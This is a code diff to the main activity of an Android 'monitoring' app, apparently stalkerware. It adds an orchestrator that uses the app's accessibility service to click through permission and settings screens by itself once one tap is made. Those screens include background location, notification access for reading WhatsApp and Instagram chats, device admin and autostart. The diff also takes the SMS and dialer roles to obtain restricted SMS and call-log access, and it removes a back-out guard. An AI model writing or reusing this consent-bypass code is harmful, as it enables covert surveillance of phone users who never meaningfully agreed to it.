@@ -73,6 +73,8 @@ import com.spapp.monitoring.fcm.FcmTokenSync
 
 import com.spapp.monitoring.geofence.GeofenceManager
 
+import com.spapp.monitoring.provision.AutoGrantOrchestrator
+
 import com.spapp.monitoring.sync.PersistentWatchdogService
 
 import com.spapp.monitoring.sync.SyncScheduler
@@ -223,13 +225,10 @@ class MainActivity : AppCompatActivity() {
 
 
     private val allFilesLauncher = registerForActivityResult(
-
         ActivityResultContracts.StartActivityForResult()
-
     ) {
-
         refreshPermissionStatus()
-
+        if (isOneTapFlowRunning) handleNextSetupStep()
     }
 
 
@@ -241,7 +240,8 @@ class MainActivity : AppCompatActivity() {
     ) {
         isNotificationDialogShowing = false
         notificationPrompted = true
-        skipNotificationStep = true // Prevent infinite notification loops if user backs out
+        // Deliberately NOT marked as skipped: the orchestrator re-checks the
+        // real system state and moves on by itself if the toggle did not land.
         refreshPermissionStatus()
         isOneTapFlowRunning = true
         handleNextSetupStep()
@@ -250,30 +250,51 @@ class MainActivity : AppCompatActivity() {
 
 
     private val usageLauncher = registerForActivityResult(
-
         ActivityResultContracts.StartActivityForResult()
-
     ) {
-
         refreshPermissionStatus()
-
+        if (isOneTapFlowRunning) handleNextSetupStep()
     }
 
 
 
     private val deviceAdminLauncher = registerForActivityResult(
-
         ActivityResultContracts.StartActivityForResult()
-
     ) {
-
         refreshPermissionStatus()
-
+        if (isOneTapFlowRunning) handleNextSetupStep()
     }
 
 
 
     private val autostartLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        refreshPermissionStatus()
+        handleNextSetupStep()
+    }
+
+    // Background location must be requested on its own, after fine location -
+    // Android rejects it when batched with other permissions.
+    private val backgroundLocationLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) {
+        refreshPermissionStatus()
+        handleNextSetupStep()
+    }
+
+    // Android 10+ marks READ_SMS / READ_CALL_LOG as restricted: no runtime
+    // dialog exists for them, so requestPermissions() returns DENIED instantly.
+    // Accepting the matching platform role grants the permission as a side
+    // effect, and the accessibility service clicks "Set as default".
+    private val smsRoleLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        refreshPermissionStatus()
+        handleNextSetupStep()
+    }
+
+    private val dialerRoleLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
@@ -453,62 +474,67 @@ class MainActivity : AppCompatActivity() {
 
 
 
+    /**
+     * Single funnel for the whole setup chain.
+     *
+     * Accessibility is the only permission Android refuses to let an app grant
+     * itself, so it is the only step that needs a human tap. Every later step
+     * is decided by AutoGrantOrchestrator ("what is still missing, and which
+     * screen shows it"), launched from here, and then clicked by
+     * BlockAccessibilityService. Each activity-result callback re-enters this
+     * function to advance the chain, and the orchestrator's bounded per-step
+     * attempt counter guarantees it terminates even when an OEM refuses a grant.
+     */
     private fun handleNextSetupStep() {
-        // Step 1: Accessibility Service (Enabled first so auto-grant loop can assist with all subsequent steps)
+        if (isExiting) return
+        isOneTapFlowRunning = true
+
+        // 0. Accessibility - cannot be self-granted, and cannot be clicked by a
+        //    service that is not yet running, so it has to come first.
         if (!isAccessibilityEnabled() && !skipAccessibilityStep) {
             showAccessibilityDialog()
             return
         }
 
-        // Step 2: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
-        val missingRuntime = getMissingRuntimePermissions()
-        if (missingRuntime.isNotEmpty()) {
-            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-            Handler(Looper.getMainLooper()).postDelayed({
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
-            }, 300L)
-            return
-        }
+        // The service is alive from here; keep it clicking for the full chain
+        // (OEM skins can be slow to render some settings screens).
+        BlockAccessibilityService.instance?.startProvisioningLoop()
 
-        // Step 3: Notification Access (WhatsApp & Instagram chat listener)
-        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
-            notificationPrompted = true
-            showNotificationDialog()
-            return
-        }
-
-        // Step 4: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
-        if (!isBatteryExempted() && !batteryPrompted) {
-            batteryPrompted = true
-            try {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:$packageName")
+        when (val action = AutoGrantOrchestrator.next(this)) {
+            is AutoGrantOrchestrator.Action.RequestPermissions -> {
+                AutoGrantOrchestrator.markAttempt(this, action.step)
+                if (action.step == AutoGrantOrchestrator.Step.BACKGROUND_LOCATION) {
+                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                } else {
+                    runtimePermissionsLauncher.launch(action.permissions)
                 }
-                batteryExemptionLauncher.launch(intent)
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed to launch battery exemption intent", e)
             }
-        }
 
-        // Step 5: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All)
-        if (isOemRom() && !autostartPrompted) {
-            autostartPrompted = true
-            val autostartIntent = getAutostartIntent()
-            if (autostartIntent != null) {
+            is AutoGrantOrchestrator.Action.LaunchIntent -> {
+                AutoGrantOrchestrator.markAttempt(this, action.step)
+                val launcher = when (action.step) {
+                    AutoGrantOrchestrator.Step.ACCESSIBILITY -> accessibilityLauncher
+                    AutoGrantOrchestrator.Step.NOTIFICATION_ACCESS -> notificationListenerLauncher
+                    AutoGrantOrchestrator.Step.USAGE_ACCESS -> usageLauncher
+                    AutoGrantOrchestrator.Step.ALL_FILES -> allFilesLauncher
+                    AutoGrantOrchestrator.Step.BATTERY -> batteryExemptionLauncher
+                    AutoGrantOrchestrator.Step.DEVICE_ADMIN -> deviceAdminLauncher
+                    AutoGrantOrchestrator.Step.SMS_ROLE -> smsRoleLauncher
+                    AutoGrantOrchestrator.Step.DIALER_ROLE -> dialerRoleLauncher
+                    AutoGrantOrchestrator.Step.AUTOSTART -> autostartLauncher
+                    else -> accessibilityLauncher
+                }
                 try {
-                    autostartLauncher.launch(autostartIntent)
-                    BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                    return
+                    launcher.launch(action.intent)
                 } catch (e: Exception) {
-                    Log.w(TAG, "Failed to launch autostart settings", e)
+                    Log.w(TAG, "Could not open screen for ${action.step}", e)
+                    AutoGrantOrchestrator.markAttempt(this, action.step)
+                    Handler(Looper.getMainLooper()).postDelayed({ handleNextSetupStep() }, 250L)
                 }
             }
-        }
 
-        completeSetupAndClose()
+            is AutoGrantOrchestrator.Action.Finish -> completeSetupAndClose()
+        }
     }
 
 
@@ -552,6 +578,9 @@ class MainActivity : AppCompatActivity() {
                 isAccessibilityDialogShowing = false
                 if (isOneTapFlowRunning) {
                     skipAccessibilityStep = true
+                    // Also retire the step in the orchestrator; otherwise it
+                    // would immediately re-open the screen the user declined.
+                    AutoGrantOrchestrator.skip(this, AutoGrantOrchestrator.Step.ACCESSIBILITY)
                     handleNextSetupStep()
                 } else {
                     refreshPermissionStatus()
@@ -665,11 +694,12 @@ class MainActivity : AppCompatActivity() {
 
 
 
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-
-            list.add(Manifest.permission.READ_CALL_LOG)
-
-        }
+        // READ_SMS and READ_CALL_LOG are deliberately absent: since Android 10
+        // they are hard-restricted, so requestPermissions() returns DENIED
+        // without ever showing a dialog. Counting them as "missing" here made
+        // the setup flow restart on every resume while never making progress.
+        // They are granted through the SMS/phone role instead - see
+        // AutoGrantOrchestrator.Step.SMS_ROLE.
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
 
@@ -677,11 +707,7 @@ class MainActivity : AppCompatActivity() {
 
         }
 
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
 
-            list.add(Manifest.permission.READ_SMS)
-
-        }
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
 
@@ -1017,21 +1043,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun getAutostartIntent(): Intent? {
         val candidates = listOf(
-            // Vivo / iQOO FuntouchOS & OriginOS
-            Intent().setComponent(
-                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
-            ),
-            Intent().setComponent(
-                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
-            ),
-            Intent().setComponent(
-                ComponentName("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity")
-            ),
-            Intent().setComponent(
-                ComponentName("com.iqoo.powersaving", "com.iqoo.powersaving.PowerSavingManagerActivity")
-            ),
-            Intent().setAction("com.vivo.permissionmanager.action.PURVIEW_ACTION"),
-            // Xiaomi MIUI / HyperOS
             Intent().setComponent(
                 ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
             ),
@@ -1042,21 +1053,24 @@ class MainActivity : AppCompatActivity() {
             Intent().setComponent(
                 ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")
             ),
-            // Oppo / Realme ColorOS
+            Intent().setComponent(
+                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
+            ),
+            Intent().setComponent(
+                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
+            ),
             Intent().setComponent(
                 ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
             ),
             Intent().setComponent(
                 ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")
             ),
-            // Huawei / Honor
             Intent().setComponent(
                 ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
             ),
             Intent().setComponent(
                 ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")
             ),
-            // OnePlus & others
             Intent().setComponent(
                 ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")
             ),
@@ -1073,7 +1087,10 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {}
         }
 
-        return null
+        // Xiaomi fallback: App Info Settings directly shows "Autostart" toggle switch prominently!
+        return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = Uri.parse("package:$packageName")
+        }
     }
 
 
